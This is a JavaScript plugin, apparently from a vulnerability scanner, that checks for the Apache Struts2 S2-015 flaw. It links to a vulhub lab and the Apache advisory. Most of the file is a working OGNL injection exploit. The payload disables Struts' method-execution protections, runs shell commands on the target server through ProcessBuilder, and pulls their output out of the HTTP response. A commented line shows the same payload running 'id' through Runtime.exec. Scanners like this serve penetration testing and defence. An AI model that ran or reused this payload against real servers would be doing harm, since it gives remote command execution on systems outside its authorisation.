module.exports={
	tags:"struts2,015",
	des:"struts2 015漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-015",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-015.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-015"],
	suport:g_szMyMsg,
	toRst:{},
/*
/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
*/
	doCheck:function (url,fnCbk)
	{
		// 比较特殊，所以需要截取
		var szUrl = url.substr(0, url.lastIndexOf('/'));
		szUrl = szUrl.replace(/(\/*\.*\/)*$/gmi,'').replace(/(\/\/\.)*$/gmi,'');

		var _t = this,ss;
		var fnC = function(szCmd,fnCbk1)
		{
			var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
			//////// 增加的关键行 start//////
			+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
			+ ",#f.setAccessible(true)"
			+ ",#f.set(#_memberAccess,true)"
			//////// 增加的关键行 end//////
			// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
			// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
			+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"')"
			+ ",#as=new java.lang.String()"
			+ ",#p.redirectErrorStream(true),#process=#p.start()"
			+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
			+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
			// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
			+ ",#as='{{'+#as+'}}'"
			+ ",#as.toString()"
			+"}";
			ss = s;
			s = fnUrlEncode(s,'|');
			request(fnOptHeader({method: 'GET',uri: szUrl +"/"+ encodeURIComponent(s) + ".action"
			    })
			  , function (error, response, body)
			   {
			  		if(body)
			  		{
			  			fnCbk1(body);
			  		}else fnCbk1('');
			    }
			  );
		};
		var a = g_szCmd.split(";"),aR = [],nC = 0;
		// a.push('echo xxx|base64');
		for(var i = 0; i < a.length; i++)
		{
			// if(-1 < a[i].indexOf("echo")){nC++;continue;}
			(function(n)
			{
				fnC(a[n],function(s)
				{
					var i = s.indexOf("{{");
					if(-1 == i)s = '';
					else s = s.substr(i + 2, s.indexOf("}}") - i - 2);
					if(!s)
					{
						if(0 == n)s = "whoami:";
						if(2 == n)s = "pwd:";
						if(4 == n)s = "cmdend";
					}
					aR[n] = s;
					nC++;
				})
			})(i);
		}
		var nT = setInterval(function()
		{
			if(nC == a.length)
			{
				clearInterval(nT);
				// console.log(aR);
				// console.log("kkkk:" +aR.join('') + "kkk");
				fnDoBody(aR.join("\n"),"s2-015",url,null,function(o)
			    	{
			    		var r = {"url":szUrl,"send":ss};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
			}
		},13);
	}
};